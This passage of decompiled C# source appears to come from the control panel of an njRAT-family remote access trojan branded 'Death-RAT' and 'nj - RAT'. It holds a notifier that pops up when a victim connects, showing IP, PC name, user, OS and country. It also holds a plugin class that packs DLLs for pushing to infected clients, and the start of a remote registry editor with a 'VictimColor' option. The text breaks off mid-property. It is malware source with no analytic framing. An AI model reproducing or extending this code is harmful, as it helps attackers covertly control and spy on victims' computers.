			Control arg_579_0 = this.Label6;
			location = new Point(170, 316);
			arg_579_0.Location = location;
			this.Label6.Name = "Label6";
			Control arg_5A4_0 = this.Label6;
			size = new Size(11, 15);
			arg_5A4_0.Size = size;
			this.Label6.TabIndex = 3;
			this.Label6.Text = "-";
			this.Label1.AutoSize = true;
			this.Label1.BackColor = Color.Transparent;
			this.Label1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.White;
			Control arg_62E_0 = this.Label1;
			location = new Point(200, 316);
			arg_62E_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_659_0 = this.Label1;
			size = new Size(27, 15);
			arg_659_0.Size = size;
			this.Label1.TabIndex = 2;
			this.Label1.Text = "I P :";
			this.Label5.AutoSize = true;
			this.Label5.BackColor = Color.Transparent;
			this.Label5.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Label5.ForeColor = Color.White;
			Control arg_6E3_0 = this.Label5;
			location = new Point(141, 316);
			arg_6E3_0.Location = location;
			this.Label5.Name = "Label5";
			Control arg_70E_0 = this.Label5;
			size = new Size(11, 15);
			arg_70E_0.Size = size;
			this.Label5.TabIndex = 1;
			this.Label5.Text = "-";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Transparent;
			this.Label3.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.White;
			Control arg_795_0 = this.Label3;
			location = new Point(70, 316);
			arg_795_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_7C0_0 = this.Label3;
			size = new Size(30, 15);
			arg_7C0_0.Size = size;
			this.Label3.TabIndex = 0;
			this.Label3.Text = "OS :";
			this.Timer1.Enabled = true;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(64, 64, 64);
			size = new Size(175, 145);
			this.ClientSize = size;
			this.Controls.Add(this.Label7);
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.Label6);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.Panel3);
			this.Controls.Add(this.Label5);
			this.Controls.Add(this.Label3);
			this.ForeColor = Color.Black;
			this.FormBorderStyle = FormBorderStyle.None;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "NOTIF";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "NOTIF";
			this.TransparencyKey = Color.Red;
			this.Panel3.ResumeLayout(false);
			this.Panel3.PerformLayout();
			this.Panel2.ResumeLayout(false);
			this.Panel2.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public NOTIF()
		{
			base.Load += new EventHandler(this.NOTIF_Load);
			base.FormClosing += new FormClosingEventHandler(this.NOTIF_FormClosing);
			NOTIF.__ENCAddToList(this);
			this.inn = checked(Screen.PrimaryScreen.Bounds.Height - Screen.PrimaryScreen.WorkingArea.Height + 2);
			this.InitializeComponent();
		}

		private void NOTIF_FormClosing(object sender, FormClosingEventArgs e)
		{
			MyProject.Computer.Audio.Stop();
		}

		private void NOTIF_Load(object sender, EventArgs e)
		{
			checked
			{
				Point location = new Point(Screen.PrimaryScreen.Bounds.Width - this.Width - 3, Screen.PrimaryScreen.Bounds.Height - this.Height - this.inn - 2);
				this.Location = location;
				location = new Point((int)Math.Round(Math.Round(unchecked((double)this.Width / 2.0 - (double)this.Label4.Width / 2.0))), 1);
				this.Label4.Location = location;
			}
		}

		private void Panel2_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		private void Panel2_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.DrawRectangle(new Pen(Color.Black, 2f), this.Panel2.ClientRectangle);
		}

		private void Panel3_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.DrawRectangle(new Pen(Color.Black, 2f), this.Panel3.ClientRectangle);
		}

		private void T1_Tick(object sender, EventArgs e)
		{
			bool flag = this.Panel3.Location.Y > 0;
			checked
			{
				if (flag)
				{
					Point location = this.Panel3.Location;
					Point location2 = new Point(1, location.Y - 2);
					this.Panel3.Location = location2;
					location = new Point(1, this.Panel2.Location.Y - 2);
					this.Panel2.Location = location;
				}
				else
				{
					this.T1.Stop();
					this.T3.Start();
				}
			}
		}

		private void T2_Tick(object sender, EventArgs e)
		{
			bool flag = this.Panel3.Location.Y < 115;
			checked
			{
				if (flag)
				{
					Point location = this.Panel3.Location;
					Point location2 = new Point(1, location.Y + 2);
					this.Panel3.Location = location2;
					location = new Point(1, this.Panel2.Location.Y + 2);
					this.Panel2.Location = location;
				}
				else
				{
					this.T2.Stop();
					this.Close();
				}
			}
		}

		private void T3_Tick(object sender, EventArgs e)
		{
			this.T2.Start();
			this.T3.Stop();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.lbl_Title.ForeColor == Color.Blue;
			if (flag)
			{
				this.lbl_Title.ForeColor = Color.Purple;
			}
			else
			{
				this.lbl_Title.ForeColor = Color.Blue;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class nt : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		[AccessedThroughProperty("P1")]
		private PictureBox _P1;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		[AccessedThroughProperty("Timer2")]
		private System.Windows.Forms.Timer _Timer2;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("WaterFX1")]
		private WaterFX _WaterFX1;

		[AccessedThroughProperty("Timer3")]
		private System.Windows.Forms.Timer _Timer3;

		[AccessedThroughProperty("lbl_Title")]
		private Label _lbl_Title;

		[AccessedThroughProperty("NsContextMenu1")]
		private NSContextMenu _NsContextMenu1;

		[AccessedThroughProperty("LogInRichTextBox1")]
		private LogInRichTextBox _LogInRichTextBox1;

		[AccessedThroughProperty("Logs1")]
		private logs _Logs1;

		[AccessedThroughProperty("LogInRichTextBox2")]
		private LogInRichTextBox _LogInRichTextBox2;

		[AccessedThroughProperty("L1")]
		private LinkLabel _L1;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		public string[] colms;

		public Bitmap mg;

		private Size sz;

		public int time;

		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual PictureBox P1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._P1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.P1_Click);
				bool flag = this._P1 != null;
				if (flag)
				{
					this._P1.Click -= value2;
				}
				this._P1 = value;
				flag = (this._P1 != null);
				if (flag)
				{
					this._P1.Click += value2;
				}
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label2_Click);
				bool flag = this._Label2 != null;
				if (flag)
				{
					this._Label2.Click -= value2;
				}
				this._Label2 = value;
				flag = (this._Label2 != null);
				if (flag)
				{
					this._Label2.Click += value2;
				}
			}
		}

		internal virtual WaterFX WaterFX1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WaterFX1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._WaterFX1 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer3 = value;
			}
		}

		internal virtual Label lbl_Title
		{
			[DebuggerNonUserCode]
			get
			{
				return this._lbl_Title;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._lbl_Title = value;
			}
		}

		internal virtual NSContextMenu NsContextMenu1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NsContextMenu1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NsContextMenu1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox1 = value;
			}
		}

		internal virtual logs Logs1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Logs1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Logs1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox2 = value;
			}
		}

		internal virtual LinkLabel L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.LinkLabel1_Paint);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.Paint -= value2;
				}
				this._L1 = value;
				flag = (this._L1 != null);
				if (flag)
				{
					this._L1.Paint += value2;
				}
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label3_Click);
				bool flag = this._Label3 != null;
				if (flag)
				{
					this._Label3.Click -= value2;
				}
				this._Label3 = value;
				flag = (this._Label3 != null);
				if (flag)
				{
					this._Label3.Click += value2;
				}
			}
		}

		public nt()
		{
			base.FormClosing += new FormClosingEventHandler(this.nt_FormClosing);
			base.KeyDown += new KeyEventHandler(this.nt_KeyDown);
			base.KeyUp += new KeyEventHandler(this.nt_KeyUp);
			base.Load += new EventHandler(this.nt_Load);
			nt.__ENCAddToList(this);
			this.colms = new string[]
			{
				"IP : ",
				"PC : ",
				"USR: ",
				"OS : ",
				"CO : "
			};
			this.sz = this.Size;
			this.time = 77;
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = nt.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = nt.__ENCList.Count == nt.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = nt.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = nt.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									nt.__ENCList[num] = nt.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						nt.__ENCList.RemoveRange(num, nt.__ENCList.Count - num);
						nt.__ENCList.Capacity = nt.__ENCList.Count;
					}
					nt.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(nt));
			this.Timer1 = new System.Windows.Forms.Timer(this.components);
			this.Label1 = new Label();
			this.Timer2 = new System.Windows.Forms.Timer(this.components);
			this.Timer3 = new System.Windows.Forms.Timer(this.components);
			this.lbl_Title = new Label();
			this.WaterFX1 = new WaterFX();
			this.Logs1 = new logs();
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.Label3 = new Label();
			this.L1 = new LinkLabel();
			this.LogInRichTextBox2 = new LogInRichTextBox();
			this.Label2 = new Label();
			this.P1 = new PictureBox();
			this.LogInRichTextBox1 = new LogInRichTextBox();
			this.NsContextMenu1 = new NSContextMenu();
			this.NyX_GroupBox1.SuspendLayout();
			((ISupportInitialize)this.P1).BeginInit();
			this.SuspendLayout();
			this.Timer1.Enabled = true;
			this.Timer1.Interval = 50;
			this.Label1.AutoSize = true;
			this.Label1.BackColor = Color.Black;
			this.Label1.Dock = DockStyle.Top;
			this.Label1.ForeColor = Color.MistyRose;
			Control arg_169_0 = this.Label1;
			Point location = new Point(0, 0);
			arg_169_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_193_0 = this.Label1;
			Size size = new Size(0, 13);
			arg_193_0.Size = size;
			this.Label1.TabIndex = 1;
			this.Label1.TextAlign = ContentAlignment.MiddleCenter;
			this.Timer2.Enabled = true;
			this.lbl_Title.AutoSize = true;
			this.lbl_Title.BackColor = Color.Transparent;
			this.lbl_Title.Font = new Font("Impact", 21.75f, FontStyle.Bold | FontStyle.Underline, GraphicsUnit.Point, 0);
			this.lbl_Title.ForeColor = Color.Blue;
			Control arg_227_0 = this.lbl_Title;
			location = new Point(417, 136);
			arg_227_0.Location = location;
			this.lbl_Title.Name = "lbl_Title";
			Control arg_255_0 = this.lbl_Title;
			size = new Size(146, 36);
			arg_255_0.Size = size;
			this.lbl_Title.TabIndex = 7;
			this.lbl_Title.Text = "Death-RAT";
			this.WaterFX1.BackColor = Color.Transparent;
			this.WaterFX1.ImageBitmap = (Bitmap)componentResourceManager.GetObject("WaterFX1.ImageBitmap");
			Control arg_2BC_0 = this.WaterFX1;
			location = new Point(315, 34);
			arg_2BC_0.Location = location;
			this.WaterFX1.Name = "WaterFX1";
			this.WaterFX1.Scale = 1;
			Control arg_2F7_0 = this.WaterFX1;
			size = new Size(163, 28);
			arg_2F7_0.Size = size;
			this.WaterFX1.TabIndex = 4;
			Control arg_323_0 = this.Logs1;
			location = new Point(184, 239);
			arg_323_0.Location = location;
			this.Logs1.Name = "Logs1";
			Control arg_351_0 = this.Logs1;
			size = new Size(184, 13);
			arg_351_0.Size = size;
			this.Logs1.TabIndex = 8;
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Controls.Add(this.Label3);
			this.NyX_GroupBox1.Controls.Add(this.L1);
			this.NyX_GroupBox1.Controls.Add(this.LogInRichTextBox2);
			this.NyX_GroupBox1.Controls.Add(this.Label2);
			this.NyX_GroupBox1.Controls.Add(this.P1);
			this.NyX_GroupBox1.Controls.Add(this.LogInRichTextBox1);
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_464_0 = this.NyX_GroupBox1;
			location = new Point(2, 0);
			arg_464_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_4BC_0 = this.NyX_GroupBox1;
			size = new Size(264, 145);
			arg_4BC_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 3;
			this.NyX_GroupBox1.Text = "nj - RAT";
			this.NyX_GroupBox1.TransparencyKey = Color.DimGray;
			this.NyX_GroupBox1.Transparent = false;
			this.Label3.AutoSize = true;
			this.Label3.Image = (Image)componentResourceManager.GetObject("Label3.Image");
			Control arg_557_0 = this.Label3;
			location = new Point(194, 34);
			arg_557_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_582_0 = this.Label3;
			size = new Size(41, 15);
			arg_582_0.Size = size;
			this.Label3.TabIndex = 10;
			this.Label3.Text = "'          '";
			this.L1.AutoSize = true;
			this.L1.LinkColor = Color.LightSteelBlue;
			Control arg_5D8_0 = this.L1;
			location = new Point(23, 34);
			arg_5D8_0.Location = location;
			this.L1.Name = "L1";
			Control arg_603_0 = this.L1;
			size = new Size(21, 15);
			arg_603_0.Size = size;
			this.L1.TabIndex = 6;
			this.L1.TabStop = true;
			this.L1.Text = "L1";
			this.LogInRichTextBox2.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox2.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_675_0 = this.LogInRichTextBox2;
			location = new Point(13, 23);
			arg_675_0.Location = location;
			this.LogInRichTextBox2.Name = "LogInRichTextBox2";
			Control arg_6A0_0 = this.LogInRichTextBox2;
			size = new Size(121, 39);
			arg_6A0_0.Size = size;
			this.LogInRichTextBox2.TabIndex = 9;
			this.LogInRichTextBox2.TextColour = Color.FromArgb(255, 255, 255);
			this.Label2.AutoSize = true;
			this.Label2.Image = (Image)componentResourceManager.GetObject("Label2.Image");
			Control arg_713_0 = this.Label2;
			location = new Point(140, 34);
			arg_713_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_73E_0 = this.Label2;
			size = new Size(41, 15);
			arg_73E_0.Size = size;
			this.Label2.TabIndex = 4;
			this.Label2.Text = "'          '";
			this.P1.BackColor = Color.Black;
			Control arg_786_0 = this.P1;
			location = new Point(13, 68);
			arg_786_0.Location = location;
			this.P1.Name = "P1";
			Control arg_7B4_0 = this.P1;
			size = new Size(242, 66);
			arg_7B4_0.Size = size;
			this.P1.TabIndex = 0;
			this.P1.TabStop = false;
			this.LogInRichTextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_815_0 = this.LogInRichTextBox1;
			location = new Point(122, 23);
			arg_815_0.Location = location;
			this.LogInRichTextBox1.Name = "LogInRichTextBox1";
			Control arg_843_0 = this.LogInRichTextBox1;
			size = new Size(133, 39);
			arg_843_0.Size = size;
			this.LogInRichTextBox1.TabIndex = 8;
			this.LogInRichTextBox1.Text = "'";
			this.LogInRichTextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.NsContextMenu1.ForeColor = Color.White;
			this.NsContextMenu1.Name = "NsContextMenu1";
			Control arg_8BC_0 = this.NsContextMenu1;
			size = new Size(61, 4);
			arg_8BC_0.Size = size;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(270, 149);
			this.ClientSize = size;
			this.Controls.Add(this.WaterFX1);
			this.Controls.Add(this.lbl_Title);
			this.Controls.Add(this.Logs1);
			this.Controls.Add(this.NyX_GroupBox1);
			this.Controls.Add(this.Label1);
			this.DoubleBuffered = true;
			this.FormBorderStyle = FormBorderStyle.None;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "nt";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.StartPosition = FormStartPosition.Manual;
			this.Text = "nt";
			this.TopMost = true;
			this.TransparencyKey = Color.Fuchsia;
			this.NyX_GroupBox1.ResumeLayout(false);
			this.NyX_GroupBox1.PerformLayout();
			((ISupportInitialize)this.P1).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public void Add(Bitmap flg, string title, params string[] texte)
		{
			checked
			{
				lock (this)
				{
					Bitmap image = new Bitmap(this.P1.Width, this.P1.Height);
					Graphics graphics = Graphics.FromImage(image);
					string text = "";
					int num = this.colms.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						text = text + this.colms[i] + texte[i] + "\r\n";
					}
					graphics.DrawString(text, this.Font, Brushes.CornflowerBlue, 1.1f, 1.1f);
					graphics.Dispose();
					this.mg = flg;
					this.L1.Text = title;
					this.P1.Image = image;
					this.time = 0;
					Thread.Sleep(200);
					Thread.Sleep(50);
					graphics.Clear(this.P1.BackColor);
				}
			}
		}

		private void nt_FormClosing(object sender, FormClosingEventArgs e)
		{
			MyProject.Computer.Audio.Stop();
			e.Cancel = true;
		}

		private void nt_KeyDown(object sender, KeyEventArgs e)
		{
			this.Timer1.Enabled = false;
			checked
			{
				switch (e.KeyCode)
				{
				case Keys.Left:
					this.Left += 3;
					break;
				case Keys.Up:
					this.Visible = false;
					this.Top -= 3;
					this.Top -= 3;
					this.Top -= 3;
					break;
				case Keys.Right:
					this.Visible = false;
					this.Left += 3;
					break;
				case Keys.Down:
					this.Visible = false;
					this.Top += 3;
					this.Top += 3;
					this.Top += 3;
					break;
				}
			}
		}

		private void nt_KeyUp(object sender, KeyEventArgs e)
		{
		}

		private void nt_Load(object sender, EventArgs e)
		{
			this.Visible = false;
		}

		private void P2_Click(object sender, EventArgs e)
		{
			this.time = 77;
		}

		private void LinkLabel1_Paint(object sender, PaintEventArgs e)
		{
			bool flag = this.mg != null;
			if (flag)
			{
				e.Graphics.DrawImage(this.mg.GetThumbnailImage(checked(this.L1.Height * 2), this.L1.Height, null, IntPtr.Zero), 0, 0);
			}
		}

		private void P1_Click(object sender, EventArgs e)
		{
			this.time = 77;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.time > 70;
			checked
			{
				if (flag)
				{
					this.Visible = false;
				}
				else
				{
					this.time++;
					this.Top += 2;
					this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 1;
					flag = !this.Visible;
					if (flag)
					{
						FN.ShowWindow(this.Handle, 4);
						this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 1;
						this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Height - 1;
					}
				}
			}
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.lbl_Title.ForeColor == Color.Blue;
			if (flag)
			{
				this.lbl_Title.ForeColor = Color.DeepPink;
			}
			else
			{
				this.lbl_Title.ForeColor = Color.Blue;
			}
		}

		private void Label2_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.P1.BackColor = colorDialog.Color;
			MySettingsProperty.Settings.Save();
		}

		private void lbl_Title_Click(object sender, EventArgs e)
		{
		}

		private void P2_Paint(object sender, PaintEventArgs e)
		{
		}

		private void Label3_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.NyX_GroupBox1.BackColor = colorDialog.Color;
			MySettingsProperty.Settings.Save();
		}
	}
}

using System;
using System.IO;
using System.Windows.Forms;

namespace nj
{
	public class plg
	{
		public string B;

		public string Hash;

		public string Name;

		public plg(string fnn)
		{
			bool flag = true;
			this.B = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(Application.StartupPath + "\\Nj_DLL\\" + fnn), ref flag));
			this.Name = fnn;
			this.Hash = FN.getMD5Hash(this.B);
		}

		public static void shw(Client c)
		{
			alrt alrt = new alrt();
			alrt.Label1.Text = c.L.Text;
			alrt.PictureBox1.Image = sokserver.F.IMG2.Images[c.L.SubItems[sokserver.hco].Text + ".png"];
			alrt.L1.Items.Add("PC").SubItems.Add(c.L.SubItems[sokserver.hpc].Text);
			alrt.L1.Items.Add("Usr").SubItems.Add(c.L.SubItems[sokserver.huser].Text);
			alrt.L1.Items.Add("OS").SubItems.Add(c.L.SubItems[sokserver.hos].Text);
			alrt.L1.View = View.Details;
			alrt.PictureBox1.SizeMode = PictureBoxSizeMode.Normal;
			alrt.TopMost = false;
			alrt.Visible = false;
			FN.ShowWindow(alrt.Handle, 8);
			alrt.shw();
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Reg : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("RGk")]
		private TreeView _RGk;

		[AccessedThroughProperty("crgk")]
		private ContextMenuStrip _crgk;

		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		[AccessedThroughProperty("CreateKeyToolStripMenuItem")]
		private ToolStripMenuItem _CreateKeyToolStripMenuItem;

		[AccessedThroughProperty("DeleteKeyToolStripMenuItem")]
		private ToolStripMenuItem _DeleteKeyToolStripMenuItem;

		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		[AccessedThroughProperty("pr")]
		private ToolStripProgressBar _pr;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		[AccessedThroughProperty("RGLIST")]
		private ListView _RGLIST;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem _ToolStripMenuItem3;

		[AccessedThroughProperty("ToolStripMenuItem4")]
		private ToolStripMenuItem _ToolStripMenuItem4;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		[AccessedThroughProperty("l1")]
		private ImageList _l1;

		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		[AccessedThroughProperty("DetailsToolStripMenuItem")]
		private ToolStripMenuItem _DetailsToolStripMenuItem;

		[AccessedThroughProperty("ListViewToolStripMenuItem")]
		private ToolStripMenuItem _ListViewToolStripMenuItem;

		[AccessedThroughProperty("ColorLinesToolStripMenuItem")]
		private ToolStripMenuItem _ColorLinesToolStripMenuItem;

		[AccessedThroughProperty("VictimColorToolStripMenuItem")]
		private ToolStripMenuItem _VictimColorToolStripMenuItem;

		public Client sk;

		internal virtual TreeView RGk
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RGk;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				TreeViewEventHandler value2 = new TreeViewEventHandler(this.RGk_AfterSelect);
				EventHandler value3 = new EventHandler(this.RGk_DoubleClick);
				EventHandler value4 = new EventHandler(this.RGk_Click);
				bool flag = this._RGk != null;
				if (flag)
				{
					this._RGk.AfterSelect -= value2;
					this._RGk.DoubleClick -= value3;
					this._RGk.Click -= value4;
				}
				this._RGk = value;
				flag = (this._RGk != null);
				if (flag)
				{
					this._RGk.AfterSelect += value2;
					this._RGk.DoubleClick += value3;
					this._RGk.Click += value4;
				}
			}
		}

		internal virtual ContextMenuStrip crgk
		{
			[DebuggerNonUserCode]
			get
			{
				return this._crgk;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._crgk = value;
			}
		}

		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
